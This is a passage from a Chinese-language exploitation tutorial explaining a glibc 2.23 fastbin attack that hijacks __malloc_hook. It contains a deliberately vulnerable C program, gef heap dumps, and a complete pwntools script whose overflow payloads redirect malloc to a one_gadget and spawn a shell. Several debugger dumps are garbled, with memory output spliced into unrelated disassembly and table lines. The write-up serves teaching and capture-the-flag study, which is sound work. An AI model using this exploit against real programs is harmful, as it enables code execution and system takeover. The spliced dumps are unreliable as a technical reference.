    ​    fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free listn", malloc(8));
    ​    fprintf(stderr, "4th malloc(8): %pn", malloc(8));
    }
###  流程分析
首先分配了三个大小相同的内存空间，分配内存大小为0x20（必为8的整数倍，并且最小为32字节）折柳使用gef插件，可以比较好的调试heap
    gef➤  x/20gx 0x603010-0x10
    0x603000:    0x0000000000000000    0x0000000000000021 :    lea    rax,[rbp-0x30]
       0x000000000040091e :    sub    rax,0x8
       0x0000000000400922 :    mov    rdx,rax
       0x0000000000400925 :    mov    rax,QWORD PTR [rbp-0x10]
       0x0000000000400929 :    mov    QWORD PTR [rax],rdx
伪造了一个Free chunk，查看内存，与我们的模拟图一致。
    +----------------------+----------------------+     /proc/sys/kernel/randomize_va_space
程序源码:
    #include
    #include
    int main()
    {
    ​    int *a=malloc(0x60);
    ​    int *b=malloc(0x60);
    ​    int *c=malloc(0x60);
    ​    printf("1st malloc(0x60)->a, addr=%p n",a);
    ​    printf("2st malloc(0x60)->b, addr=%p n",b);
    ​    printf("3st malloc(x060)->c, addr=%p n",c);
    ​    free(c);
    ​    free(b);
    ​    printf("free b and c");
    ​    puts("heap overflow:");
    ​    read(0,a,0x200);
    ​    printf("a=%s",a);
    ​    int *d=malloc(0x60);
    ​    int *e=malloc(0x60);
    ​    puts("please write:");
    ​    read(0,e,0x64);
    ​    malloc(0x60);
    }
通过查看内存可以找到
Malloc_hook偏移35字节，可以构成fake_chunk(size=0x7f)
    gef➤  x/20xg 0x7ffff7dd1b10-35
    0x7ffff7dd1aed :    0xfff7dd0260000000    0x000000000000007f  :    0x000000000000007f    0x0000000000000000
    0x7ffff7dd1b1d:    0x0100000000000000    0x0000000000000000
通过写入chunk_A，覆盖被Free的Chunk_B，修改其FD指针指向malloc_hook-35的fake_chunk
    gef➤  heap bin fast
    ─────[ Fastbins for arena 0x7ffff7dd1b20 ]────
    Fastbin[0] 0x00
    ...: 
    Fastbin[5]  →   UsedChunk(addr=0x602080,size=0x70)   →   UsedChunk(addr=0x7ffff7dd1afd,size=0x7c)
接下来两次malloc，第二次malloc的时候，$rax被赋值0x00007ffff7dd1afd，就在malloc_hook-35的位置成了我们的内存空间（指针e）。此时向e写入35以上的字符就能malloc_hook的值。
结合我们获取的one_gadget，程序结尾调用malloc就会自动跳转到one_gadget.
PS:如果实战中的利用手法可以参考我IE漏洞分析UAF的[文章](https://www.anquanke.com/post/id/190590)，使用栈翻转来执行ROP链，利用原理都是通用的，此处不再赘述。
给出完整利用代码[仅限libc.2.23.so]
    from pwn import *
    p=process("./fastbins_attack")
    gdb.attach(p,"b main")
    malloc_hook=0x3c4b10
    one_gadget=0x45216 # execve("/bin/sh", rsp+0x30, environ)
    base=0x00007ffff7a0d000 #libc-2.23.so
    payload1="A"*0x68
    payload1+=p64(0x71)
    payload1+=p64(malloc_hook+base-35)
    print "malloc_hook="+str(malloc_hook)
    print "[+]sending payload.."
    #p.recvuntil("overflow:")
    p.sendline(payload1)
    print "[+]sending payload2.."
    payload2="A"*(35-16)+p64(one_gadget+base)
    p.recvuntil("write:")
    p.sendline(payload2)
    p.interactive()
覆盖malloc_hook为one_gadget地址
    gef➤  x/10gx 0x7ffff7dd1b10
    0x7ffff7dd1b10 :    0x00007ffff7a52216    0x000000000000000a
继续运行便返回一个shell
    gef➤  n
    process 66236 is executing new program: /bin/dash
## 参考文献:
[1]fastbin attack漏洞之__malloc_hook攻击
[2]银河实验室.浅析Linux堆溢出之fastbin,
[3]华庭(庄明强).《glibc内存管理ptmalloc2源代码分析》2011-4-17